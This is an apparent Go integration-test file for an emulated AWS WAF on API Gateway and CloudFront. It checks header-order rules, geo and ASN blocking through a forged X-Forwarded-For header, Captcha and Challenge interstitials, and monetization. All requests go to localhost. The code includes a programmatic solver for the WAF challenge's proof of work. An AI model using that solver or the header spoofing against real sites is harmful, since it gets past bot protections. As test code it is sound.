		// no DNS record); ServerName drives the SNI handshake and the
		// explicit Host carries the alias a DNS-resolving client would
		// send.
		tlsReq, err := http.NewRequest(http.MethodGet, fmt.Sprintf("https://127.0.0.1:%d/.well-known/health", cloudFrontTLSIntegPort), nil)
		if err != nil {
			return fmt.Errorf("build TLS request: %w", err)
		}
		tlsReq.Host = alias
		tlsResp, err := tlsClient.Do(tlsReq)
		if err != nil {
			return fmt.Errorf("TLS request: %w", err)
		}
		defer tlsResp.Body.Close()
		tlsBody, _ := io.ReadAll(tlsResp.Body)
		if tlsResp.StatusCode != http.StatusOK {
			return fmt.Errorf("TLS request: expected 200, got %d (body: %s)", tlsResp.StatusCode, tlsBody)
		}
		if tlsResp.TLS == nil || len(tlsResp.TLS.PeerCertificates) == 0 {
			return fmt.Errorf("TLS request carried no peer certificate")
		}
		if cn := tlsResp.TLS.PeerCertificates[0].Subject.CommonName; cn != alias {
			return fmt.Errorf("served certificate CN = %q, want the attached ACM certificate for %q", cn, alias)
		}

		// https-only refuses plain HTTP with 403.
		cfgResp, err := ic.cloudfront.GetDistributionConfig(ic.ctx, &cloudfront.GetDistributionConfigInput{Id: aws.String(distID)})
		if err != nil {
			return err
		}
		cfgResp.DistributionConfig.DefaultCacheBehavior.ViewerProtocolPolicy = cftypes.ViewerProtocolPolicyHttpsOnly
		if _, err := ic.cloudfront.UpdateDistribution(ic.ctx, &cloudfront.UpdateDistributionInput{
			Id: aws.String(distID), IfMatch: cfgResp.ETag, DistributionConfig: cfgResp.DistributionConfig,
		}); err != nil {
			return fmt.Errorf("switch to https-only: %w", err)
		}
		resp, body, err = plainHTTPSend("/.well-known/health")
		if err != nil {
			return fmt.Errorf("plain-HTTP request under https-only: %w", err)
		}
		if resp.StatusCode != http.StatusForbidden {
			return fmt.Errorf("plain-HTTP request under https-only: expected 403, got %d (body: %s)", resp.StatusCode, body)
		}
		return nil
	})
}

// runWAFEnforcementHeaderOrder verifies the HeaderOrder request component
// against the wire order of the request's header names. The SDK client
// cannot control header order, so the probe exchanges raw HTTP/1.1
// requests: Zeta-Header before Alpha-Header must match an EXACTLY
// colon-separated rule, and the reversed order must not.
func (r *TestRunner) runWAFEnforcementHeaderOrder(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-order-acl-%s", ts)
	apiName := fmt.Sprintf("integ-order-api-%s", ts)

	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeRegional, []waftypes.Rule{{
		Name:     aws.String("OrderProbe"),
		Priority: 1,
		Action:   &waftypes.RuleAction{Block: &waftypes.BlockAction{}},
		Statement: &waftypes.Statement{
			ByteMatchStatement: &waftypes.ByteMatchStatement{
				FieldToMatch: &waftypes.FieldToMatch{HeaderOrder: &waftypes.HeaderOrder{
					OversizeHandling: waftypes.OversizeHandlingContinue,
				}},
				PositionalConstraint: waftypes.PositionalConstraintContains,
				SearchString:         []byte("host:zeta-header:alpha-header"),
				TextTransformations: []waftypes.TextTransformation{
					{Priority: 0, Type: waftypes.TextTransformationTypeNone},
				},
			},
		},
		VisibilityConfig: wafACLVisibility("OrderProbeRule"),
	}})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_HeaderOrder", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeRegional, aclARN)

	api, err := ic.apigateway.CreateRestApi(ic.ctx, &apigateway.CreateRestApiInput{Name: aws.String(apiName)})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_HeaderOrder", func() error { return fmt.Errorf("create rest api: %w", err) })
	}
	apiID := aws.ToString(api.Id)
	defer ic.apigateway.DeleteRestApi(ic.ctx, &apigateway.DeleteRestApiInput{RestApiId: api.Id})

	resource, err := ic.apigateway.CreateResource(ic.ctx, &apigateway.CreateResourceInput{
		RestApiId: api.Id, ParentId: api.RootResourceId, PathPart: aws.String("order"),
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_HeaderOrder", func() error { return fmt.Errorf("create resource: %w", err) })
	}
	if _, err := ic.apigateway.PutMethod(ic.ctx, &apigateway.PutMethodInput{
		RestApiId: api.Id, ResourceId: resource.Id,
		HttpMethod: aws.String("GET"), AuthorizationType: aws.String("NONE"),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_HeaderOrder", func() error { return fmt.Errorf("put method: %w", err) })
	}
	deployment, err := ic.apigateway.CreateDeployment(ic.ctx, &apigateway.CreateDeploymentInput{RestApiId: api.Id})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_HeaderOrder", func() error { return fmt.Errorf("create deployment: %w", err) })
	}
	if _, err := ic.apigateway.CreateStage(ic.ctx, &apigateway.CreateStageInput{
		RestApiId: api.Id, StageName: aws.String("orderstage"), DeploymentId: deployment.Id,
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_HeaderOrder", func() error { return fmt.Errorf("create stage: %w", err) })
	}

	stageARN := fmt.Sprintf("arn:aws:apigateway:%s::/restapis/%s/stages/orderstage", ic.region, apiID)
	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(stageARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_HeaderOrder", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(stageARN)})

	path := fmt.Sprintf("/restapis/%s/orderstage/_user_request_/order", apiID)
	return r.RunTest(integSvc, "WAF_Enforcement_HeaderOrder", func() error {
		matching, matchingBody, err := sendRawHeaderOrderRequest(apiGatewayIntegPort, path, "Zeta-Header: z\r\nAlpha-Header: a\r\n")
		if err != nil {
			return fmt.Errorf("wire-ordered request: %w", err)
		}
		if matching != http.StatusForbidden {
			return fmt.Errorf("wire-ordered request: expected 403 from the HeaderOrder match, got %d (body: %s)", matching, matchingBody)
		}
		reversed, reversedBody, err := sendRawHeaderOrderRequest(apiGatewayIntegPort, path, "Alpha-Header: a\r\nZeta-Header: z\r\n")
		if err != nil {
			return fmt.Errorf("reversed request: %w", err)
		}
		if reversed == http.StatusForbidden {
			return fmt.Errorf("reversed request must not match the HeaderOrder rule, got 403 (body: %s)", reversedBody)
		}
		pipelined, err := sendRawPipelinedHeaderOrderRequests(apiGatewayIntegPort, path)
		if err != nil {
			return fmt.Errorf("pipelined requests: %w", err)
		}
		if pipelined[0] != http.StatusForbidden {
			return fmt.Errorf("first pipelined request must match the HeaderOrder rule, got %d", pipelined[0])
		}
		if pipelined[1] == http.StatusForbidden {
			return fmt.Errorf("second pipelined request must not match the HeaderOrder rule, got 403")
		}
		return nil
	})
}

// sendRawPipelinedHeaderOrderRequests writes two HTTP/1.1 GETs back to
// back over one connection before reading either response. The first
// request carries Zeta-Header before Alpha-Header (the rule's match)
// and the second only Alpha-Header; a pipelining implementation that
// lets the second head's order overwrite the first request's capture
// fails the first response.
func sendRawPipelinedHeaderOrderRequests(port int, path string) ([2]int, error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 10*time.Second)
	if err != nil {
		return [2]int{}, err
	}
	defer conn.Close()
	var statuses [2]int
	wire := "GET " + path + " HTTP/1.1\r\nHost: 127.0.0.1\r\nZeta-Header: z\r\nAlpha-Header: a\r\n\r\n" +
		"GET " + path + " HTTP/1.1\r\nHost: 127.0.0.1\r\nAlpha-Header: a\r\nConnection: close\r\n\r\n"
	if _, err := conn.Write([]byte(wire)); err != nil {
		return statuses, err
	}
	if err := conn.SetReadDeadline(time.Now().Add(10 * time.Second)); err != nil {
		return statuses, err
	}
	response, err := io.ReadAll(bufio.NewReader(conn))
	if err != nil {
		return statuses, err
	}
	parts := strings.Split(string(response), "HTTP/1.1 ")
	for i, part := range parts[1:] {
		fields := strings.Fields(part)
		if len(fields) < 1 {
			return statuses, fmt.Errorf("malformed status line %q", part)
		}
		status, err := strconv.Atoi(fields[0])
		if err != nil {
			return statuses, fmt.Errorf("malformed status line %q", part)
		}
		statuses[i] = status
	}
	return statuses, nil
}

// sendRawHeaderOrderRequest performs one hand-written HTTP/1.1 GET whose
// headers appear in the given wire order and returns the response status
// and body.
func sendRawHeaderOrderRequest(port int, path, orderedHeaders string) (int, string, error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 10*time.Second)
	if err != nil {
		return 0, "", err
	}
	defer conn.Close()
	request := "GET " + path + " HTTP/1.1\r\nHost: 127.0.0.1\r\n" + orderedHeaders + "Connection: close\r\n\r\n"
	if _, err := conn.Write([]byte(request)); err != nil {
		return 0, "", err
	}
	if err := conn.SetReadDeadline(time.Now().Add(10 * time.Second)); err != nil {
		return 0, "", err
	}
	response, err := io.ReadAll(bufio.NewReader(conn))
	if err != nil {
		return 0, "", err
	}
	head, body, _ := strings.Cut(string(response), "\r\n\r\n")
	fields := strings.Fields(strings.SplitN(head, "\n", 2)[0])
	if len(fields) < 2 {
		return 0, "", fmt.Errorf("malformed status line %q", head)
	}
	status, err := strconv.Atoi(fields[1])
	if err != nil {
		return 0, "", fmt.Errorf("malformed status line %q", head)
	}
	return status, body, nil
}

// runWAFEnforcementGeoAsn blocks on the country and origin ASN of the
// forwarded-IP header's first address, resolved through the embedded
// registry/routing-derived tables. The local client address carries no
// country, so the forwarded-IP configuration is the controllable path.
func (r *TestRunner) runWAFEnforcementGeoAsn(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-geo-acl-%s", ts)
	apiName := fmt.Sprintf("integ-geo-api-%s", ts)
	forwarded := &waftypes.ForwardedIPConfig{
		HeaderName:       aws.String("X-Forwarded-For"),
		FallbackBehavior: waftypes.FallbackBehaviorNoMatch,
	}
	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeRegional, []waftypes.Rule{
		{
			Name: aws.String("GeoUS"), Priority: 1,
			Action:           &waftypes.RuleAction{Block: &waftypes.BlockAction{}},
			Statement:        &waftypes.Statement{GeoMatchStatement: &waftypes.GeoMatchStatement{CountryCodes: []waftypes.CountryCode{"US"}, ForwardedIPConfig: forwarded}},
			VisibilityConfig: wafACLVisibility("GeoUSRule"),
		},
		{
			Name: aws.String("AsnGoogle"), Priority: 2,
			Action:           &waftypes.RuleAction{Block: &waftypes.BlockAction{}},
			Statement:        &waftypes.Statement{AsnMatchStatement: &waftypes.AsnMatchStatement{AsnList: []int64{15169}, ForwardedIPConfig: forwarded}},
			VisibilityConfig: wafACLVisibility("AsnGoogleRule"),
		},
		{
			// With the forwarded header present and a non-US address the
			// negation matches and blocks; with the header absent the
			// rule is not applied at all, so the negation must not
			// invert into a block.
			Name: aws.String("NotGeoUS"), Priority: 3,
			Action: &waftypes.RuleAction{Block: &waftypes.BlockAction{}},
			Statement: &waftypes.Statement{NotStatement: &waftypes.NotStatement{
				Statement: &waftypes.Statement{GeoMatchStatement: &waftypes.GeoMatchStatement{
					CountryCodes: []waftypes.CountryCode{"US"}, ForwardedIPConfig: forwarded,
				}},
			}},
			VisibilityConfig: wafACLVisibility("NotGeoUSRule"),
		},
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_GeoAsn", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeRegional, aclARN)

	api, err := ic.apigateway.CreateRestApi(ic.ctx, &apigateway.CreateRestApiInput{Name: aws.String(apiName)})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_GeoAsn", func() error { return fmt.Errorf("create rest api: %w", err) })
	}
	apiID := aws.ToString(api.Id)
	defer ic.apigateway.DeleteRestApi(ic.ctx, &apigateway.DeleteRestApiInput{RestApiId: api.Id})

	resource, err := ic.apigateway.CreateResource(ic.ctx, &apigateway.CreateResourceInput{
		RestApiId: api.Id, ParentId: api.RootResourceId, PathPart: aws.String("geo"),
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_GeoAsn", func() error { return fmt.Errorf("create resource: %w", err) })
	}
	if _, err := ic.apigateway.PutMethod(ic.ctx, &apigateway.PutMethodInput{
		RestApiId: api.Id, ResourceId: resource.Id,
		HttpMethod: aws.String("GET"), AuthorizationType: aws.String("NONE"),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_GeoAsn", func() error { return fmt.Errorf("put method: %w", err) })
	}
	deployment, err := ic.apigateway.CreateDeployment(ic.ctx, &apigateway.CreateDeploymentInput{RestApiId: api.Id})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_GeoAsn", func() error { return fmt.Errorf("create deployment: %w", err) })
	}
	if _, err := ic.apigateway.CreateStage(ic.ctx, &apigateway.CreateStageInput{
		RestApiId: api.Id, StageName: aws.String("geostage"), DeploymentId: deployment.Id,
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_GeoAsn", func() error { return fmt.Errorf("create stage: %w", err) })
	}

	stageARN := fmt.Sprintf("arn:aws:apigateway:%s::/restapis/%s/stages/geostage", ic.region, apiID)
	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(stageARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_GeoAsn", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(stageARN)})

	path := fmt.Sprintf("/restapis/%s/geostage/_user_request_/geo", apiID)
	return r.RunTest(integSvc, "WAF_Enforcement_GeoAsn", func() error {
		// 8.8.8.8 delegates to the US registry region and originates
		// from AS15169: both rules match.
		blocked, body, err := sendRawHeaderOrderRequest(apiGatewayIntegPort, path, "X-Forwarded-For: 8.8.8.8\r\n")
		if err != nil {
			return err
		}
		if blocked != http.StatusForbidden {
			return fmt.Errorf("US/AS15169 request: expected 403, got %d (body: %s)", blocked, body)
		}
		// 1.0.0.1 delegates to AU and originates from a non-listed AS:
		// the negated geo rule matches, so the request is blocked.
		allowed, body, err := sendRawHeaderOrderRequest(apiGatewayIntegPort, path, "X-Forwarded-For: 1.0.0.1\r\n")
		if err != nil {
			return err
		}
		if allowed != http.StatusForbidden {
			return fmt.Errorf("AU request must match the negated geo rule (got %d, body: %s)", allowed, body)
		}
		// Without the forwarded header every geo/ASN rule of this ACL is
		// not applied — including the negated one, whose inversion must
		// not turn the absent header into a block.
		noHeader, body, err := sendRawHeaderOrderRequest(apiGatewayIntegPort, path, "Accept: application/json\r\n")
		if err != nil {
			return err
		}
		if noHeader == http.StatusForbidden {
			return fmt.Errorf("request without the forwarded header must not be blocked (body: %s)", body)
		}
		return nil
	})
}

// wafChallengeParams mirrors the machine-readable parameter block an
// interrupting Captcha or Challenge response embeds for non-browser
// clients.
type wafChallengeParams struct {
	ChallengeID   string `json:"challengeId"`
	Kind          string `json:"kind"`
	TokenEndpoint string `json:"tokenEndpoint"`
	Difficulty    int    `json:"difficulty"`
}

// parseWAFInterstitial extracts the challenge parameters from an
// interstitial page's JSON script element.
func parseWAFInterstitial(body string) (wafChallengeParams, error) {
	var params wafChallengeParams
	const openTag = `<script type="application/json" id="awswaf-challenge">`
	start := strings.Index(body, openTag)
	if start < 0 {
		return params, fmt.Errorf("interstitial parameter block not found in body: %.200s", body)
	}
	rest := body[start+len(openTag):]
	end := strings.Index(rest, "</script>")
	if end < 0 {
		return params, fmt.Errorf("interstitial parameter block is unterminated")
	}
	if err := json.Unmarshal([]byte(rest[:end]), &params); err != nil {
		return params, fmt.Errorf("interstitial parameters are not JSON: %w", err)
	}
	if params.ChallengeID == "" || params.Difficulty <= 0 || params.TokenEndpoint == "" {
		return params, fmt.Errorf("incomplete interstitial parameters: %+v", params)
	}
	return params, nil
}

// solveWAFChallenge computes the interstitial's proof of work: the smallest
// counter whose SHA-256 digest over "<challengeId>.<counter>" begins with
// the requested number of hex zeros. The exchange endpoint verifies the
// same construction, so the solution the browser script would find is
// reproduced here in Go.
func solveWAFChallenge(challengeID string, difficulty int) string {
	prefix := strings.Repeat("0", difficulty)
	for counter := 0; ; counter++ {
		candidate := strconv.Itoa(counter)
		digest := sha256.Sum256([]byte(challengeID + "." + candidate))
		if strings.HasPrefix(hex.EncodeToString(digest[:]), prefix) {
			return candidate
		}
	}
}

// wafMockStage creates a REST API with one GET mock method at pathPart,
// deploys it and returns the API id and the stage ARN used for the
// execute-api WebACL association. The caller owns the API lifecycle.
func (ic *integClients) wafMockStage(apiName, pathPart, stageName string) (string, string, error) {
	api, err := ic.apigateway.CreateRestApi(ic.ctx, &apigateway.CreateRestApiInput{
		Name: aws.String(apiName),
	})
	if err != nil {
		return "", "", fmt.Errorf("create rest api: %w", err)
	}
	apiID := aws.ToString(api.Id)

	resource, err := ic.apigateway.CreateResource(ic.ctx, &apigateway.CreateResourceInput{
		RestApiId: api.Id, ParentId: api.RootResourceId, PathPart: aws.String(pathPart),
	})
	if err != nil {
		return apiID, "", fmt.Errorf("create resource: %w", err)
	}

	for _, call := range []struct {
		name string
		fn   func() error
	}{
		{"put method", func() error {
			_, err := ic.apigateway.PutMethod(ic.ctx, &apigateway.PutMethodInput{
				RestApiId: api.Id, ResourceId: resource.Id,
				HttpMethod: aws.String("GET"), AuthorizationType: aws.String("NONE"),
			})
			return err
		}},
		{"put integration", func() error {
			_, err := ic.apigateway.PutIntegration(ic.ctx, &apigateway.PutIntegrationInput{
				RestApiId: api.Id, ResourceId: resource.Id, HttpMethod: aws.String("GET"),
				Type: apigwtypes.IntegrationTypeMock,
			})
			return err
		}},
		{"put method response", func() error {
			_, err := ic.apigateway.PutMethodResponse(ic.ctx, &apigateway.PutMethodResponseInput{
				RestApiId: api.Id, ResourceId: resource.Id, HttpMethod: aws.String("GET"),
				StatusCode: aws.String("200"),
			})
			return err
		}},
		{"put integration response", func() error {
			_, err := ic.apigateway.PutIntegrationResponse(ic.ctx, &apigateway.PutIntegrationResponseInput{
				RestApiId: api.Id, ResourceId: resource.Id, HttpMethod: aws.String("GET"),
				StatusCode: aws.String("200"),
			})
			return err
		}},
	} {
		if err := call.fn(); err != nil {
			return apiID, "", fmt.Errorf("%s: %w", call.name, err)
		}
	}

	deployment, err := ic.apigateway.CreateDeployment(ic.ctx, &apigateway.CreateDeploymentInput{RestApiId: api.Id})
	if err != nil {
		return apiID, "", fmt.Errorf("create deployment: %w", err)
	}
	if _, err := ic.apigateway.CreateStage(ic.ctx, &apigateway.CreateStageInput{
		RestApiId: api.Id, StageName: aws.String(stageName), DeploymentId: deployment.Id,
	}); err != nil {
		return apiID, "", fmt.Errorf("create stage: %w", err)
	}
	return apiID, fmt.Sprintf("arn:aws:apigateway:%s::/restapis/%s/stages/%s", ic.region, apiID, stageName), nil
}

// wafUserAgentActionRule builds a rule matching a User-Agent fragment with
// the given action, so every request of the probe client is subject to it.
func wafUserAgentActionRule(name string, action *waftypes.RuleAction, probe string) waftypes.Rule {
	return waftypes.Rule{
		Name:     aws.String(name),
		Priority: 1,
		Action:   action,
		Statement: &waftypes.Statement{
			ByteMatchStatement: &waftypes.ByteMatchStatement{
				FieldToMatch: &waftypes.FieldToMatch{
					SingleHeader: &waftypes.SingleHeader{Name: aws.String("user-agent")},
				},
				PositionalConstraint: waftypes.PositionalConstraintContains,
				SearchString:         []byte(probe),
				TextTransformations: []waftypes.TextTransformation{
					{Priority: 0, Type: waftypes.TextTransformationTypeNone},
				},
			},
		},
		VisibilityConfig: wafACLVisibility(name + "Rule"),
	}
}

// wafSolveAndExchange runs the token leg shared by the Captcha and
// Challenge flows: it solves the interstitial's proof of work, exchanges
// the solution at the reserved token endpoint and returns the value of the
// aws-waf-token cookie the exchange sets.
func (r *TestRunner) wafSolveAndExchange(listenerPort int, params wafChallengeParams) (string, error) {
	counter := solveWAFChallenge(params.ChallengeID, params.Difficulty)
	submission, err := json.Marshal(map[string]string{
		"challengeId": params.ChallengeID,
		"counter":     counter,
	})
	if err != nil {
		return "", err
	}
	resp, body, err := r.integHTTPSend(http.MethodPost,
		fmt.Sprintf("http://127.0.0.1:%d%s", listenerPort, params.TokenEndpoint), "",
		map[string]string{"Content-Type": "application/json"}, submission)
	if err != nil {
		return "", fmt.Errorf("token exchange: %w", err)
	}
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("token exchange: expected 200, got %d (body: %s)", resp.StatusCode, body)
	}
	for _, cookie := range resp.Cookies() {
		if cookie.Name == "aws-waf-token" {
			return cookie.Value, nil
		}
	}
	return "", fmt.Errorf("token exchange set no aws-waf-token cookie")
}

// runWAFEnforcementCaptcha verifies the Captcha action on the API Gateway
// runtime plane: a client without a token is interrupted with 405 and
// x-amzn-waf-action; a text/html client additionally receives the
// interstitial, whose embedded challenge can be solved and exchanged for
// the aws-waf-token cookie that then admits the retry.
func (r *TestRunner) runWAFEnforcementCaptcha(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-captcha-acl-%s", ts)
	apiName := fmt.Sprintf("integ-captcha-api-%s", ts)

	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeRegional, []waftypes.Rule{
		wafUserAgentActionRule("CaptchaProbe", &waftypes.RuleAction{Captcha: &waftypes.CaptchaAction{}}, "captcha-probe"),
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Captcha", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeRegional, aclARN)

	apiID, stageARN, err := ic.wafMockStage(apiName, "probe", "captchastage")
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Captcha", func() error { return err })
	}
	defer ic.apigateway.DeleteRestApi(ic.ctx, &apigateway.DeleteRestApiInput{RestApiId: aws.String(apiID)})

	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(stageARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Captcha", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(stageARN)})

	url := fmt.Sprintf("http://127.0.0.1:%d/restapis/%s/captchastage/_user_request_/probe", apiGatewayIntegPort, apiID)

	return r.RunTest(integSvc, "WAF_Enforcement_Captcha", func() error {
		// A non-HTML client is interrupted without the interstitial.
		resp, body, err := r.integHTTPSend(http.MethodGet, url, "", map[string]string{
			"User-Agent": "captcha-probe", "Accept": "application/json",
		}, nil)
		if err != nil {
			return fmt.Errorf("tokenless request: %w", err)
		}
		if resp.StatusCode != http.StatusMethodNotAllowed {
			return fmt.Errorf("tokenless request: expected 405, got %d (body: %s)", resp.StatusCode, body)
		}
		if got := resp.Header.Get("x-amzn-waf-action"); got != "captcha" {
			return fmt.Errorf("x-amzn-waf-action = %q, want captcha", got)
		}
		if body != "" {
			return fmt.Errorf("non-HTML client received an interstitial body: %.200s", body)
		}

		// A text/html client receives the interstitial with the embedded
		// challenge parameters.
		resp, body, err = r.integHTTPSend(http.MethodGet, url, "", map[string]string{
			"User-Agent": "captcha-probe", "Accept": "text/html,application/xhtml+xml",
		}, nil)
		if err != nil {
			return fmt.Errorf("html request: %w", err)
		}
		if resp.StatusCode != http.StatusMethodNotAllowed {
			return fmt.Errorf("html request: expected 405, got %d", resp.StatusCode)
		}
		params, err := parseWAFInterstitial(body)
		if err != nil {
			return err
		}
		if params.Kind != "captcha" {
			return fmt.Errorf("interstitial kind = %q, want captcha", params.Kind)
		}

		token, err := r.wafSolveAndExchange(apiGatewayIntegPort, params)
		if err != nil {
			return err
		}

		// The retry with the exchanged token behaves like a counted match
		// and reaches the method.
		resp, body, err = r.integHTTPSend(http.MethodGet, url, "", map[string]string{
			"User-Agent": "captcha-probe",
			"Accept":     "text/html",
			"Cookie":     "aws-waf-token=" + token,
		}, nil)
		if err != nil {
			return fmt.Errorf("token-carrying request: %w", err)
		}
		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("token-carrying request: expected 200, got %d (body: %s)", resp.StatusCode, body)
		}
		return nil
	})
}

// runWAFEnforcementChallenge verifies the Challenge action on the API
// Gateway runtime plane: the interruption is 202 with x-amzn-waf-action,
// and a solved challenge token admits the retry.
func (r *TestRunner) runWAFEnforcementChallenge(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-challenge-acl-%s", ts)
	apiName := fmt.Sprintf("integ-challenge-api-%s", ts)

	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeRegional, []waftypes.Rule{
		wafUserAgentActionRule("ChallengeProbe", &waftypes.RuleAction{Challenge: &waftypes.ChallengeAction{}}, "challenge-probe"),
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Challenge", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeRegional, aclARN)

	apiID, stageARN, err := ic.wafMockStage(apiName, "probe", "challengestage")
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Challenge", func() error { return err })
	}
	defer ic.apigateway.DeleteRestApi(ic.ctx, &apigateway.DeleteRestApiInput{RestApiId: aws.String(apiID)})

	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(stageARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Challenge", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(stageARN)})

	url := fmt.Sprintf("http://127.0.0.1:%d/restapis/%s/challengestage/_user_request_/probe", apiGatewayIntegPort, apiID)

	return r.RunTest(integSvc, "WAF_Enforcement_Challenge", func() error {
		resp, body, err := r.integHTTPSend(http.MethodGet, url, "", map[string]string{
			"User-Agent": "challenge-probe", "Accept": "text/html",
		}, nil)
		if err != nil {
			return fmt.Errorf("tokenless request: %w", err)
		}
		if resp.StatusCode != http.StatusAccepted {
			return fmt.Errorf("tokenless request: expected 202, got %d (body: %s)", resp.StatusCode, body)
		}
		if got := resp.Header.Get("x-amzn-waf-action"); got != "challenge" {
			return fmt.Errorf("x-amzn-waf-action = %q, want challenge", got)
		}
		params, err := parseWAFInterstitial(body)
		if err != nil {
			return err
		}
		if params.Kind != "challenge" {
			return fmt.Errorf("interstitial kind = %q, want challenge", params.Kind)
		}

		token, err := r.wafSolveAndExchange(apiGatewayIntegPort, params)
		if err != nil {
			return err
		}

		resp, body, err = r.integHTTPSend(http.MethodGet, url, "", map[string]string{
			"User-Agent": "challenge-probe",
			"Cookie":     "aws-waf-token=" + token,
		}, nil)
		if err != nil {
			return fmt.Errorf("token-carrying request: %w", err)
		}
		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("token-carrying request: expected 200, got %d (body: %s)", resp.StatusCode, body)
		}
		return nil
	})
}

// runWAFEnforcementMonetize verifies the Monetize action on the CloudFront
// plane: a matching request is interrupted with 402 carrying a JSON price
// manifest derived from the web ACL's monetization configuration, while a
// non-matching request reaches the origin.
func (r *TestRunner) runWAFEnforcementMonetize(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-monetize-acl-%s", ts)
	distName := fmt.Sprintf("integ-monetize-dist-%s", ts)

	create, err := ic.wafv2.CreateWebACL(ic.ctx, &wafv2.CreateWebACLInput{
		Name:             aws.String(aclName),
		Scope:            waftypes.ScopeCloudfront,
		DefaultAction:    &waftypes.DefaultAction{Allow: &waftypes.AllowAction{}},
		VisibilityConfig: wafACLVisibility(strings.ReplaceAll(aclName, "-", "") + "Metric"),
		MonetizationConfig: &waftypes.MonetizationConfig{
			CurrencyMode: waftypes.CurrencyModeTest,
			CryptoConfig: &waftypes.CryptoConfig{
				PaymentNetworks: []waftypes.PaymentNetwork{{
					Chain:         waftypes.BlockchainChainBaseSepolia,
					WalletAddress: aws.String("0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed"),
					Prices:        []waftypes.Price{{Amount: aws.String("0.010"), Currency: waftypes.CryptoCurrencyUsdc}},
				}},
			},
		},
		Rules: []waftypes.Rule{{
			Name:     aws.String("MonetizeProbe"),
			Priority: 1,
			Action: &waftypes.RuleAction{
				Monetize: &waftypes.MonetizeAction{PriceMultiplier: aws.String("2")},
			},
			Statement: &waftypes.Statement{
				ByteMatchStatement: &waftypes.ByteMatchStatement{
					FieldToMatch:         &waftypes.FieldToMatch{UriPath: &waftypes.UriPath{}},
					PositionalConstraint: waftypes.PositionalConstraintContains,
					SearchString:         []byte("paid-zone"),
					TextTransformations: []waftypes.TextTransformation{
						{Priority: 0, Type: waftypes.TextTransformationTypeNone},
					},
				},
			},
			VisibilityConfig: wafACLVisibility("MonetizeProbeRule"),
		}},
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Monetize", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	aclARN := aws.ToString(create.Summary.ARN)
	defer ic.wafDeleteACL(aclName, waftypes.ScopeCloudfront, aclARN)

	distResp, err := ic.cloudfront.CreateDistribution(ic.ctx, &cloudfront.CreateDistributionInput{
		DistributionConfig: &cftypes.DistributionConfig{
			CallerReference: aws.String(distName),
			Enabled:         aws.Bool(true),
			Comment:         aws.String("Monetize enforcement integration test"),
			Origins: &cftypes.Origins{
				Quantity: aws.Int32(1),
				Items: []cftypes.Origin{{
					Id:         aws.String("integ-origin"),
					DomainName: aws.String("127.0.0.1:50080"),
					CustomOriginConfig: &cftypes.CustomOriginConfig{
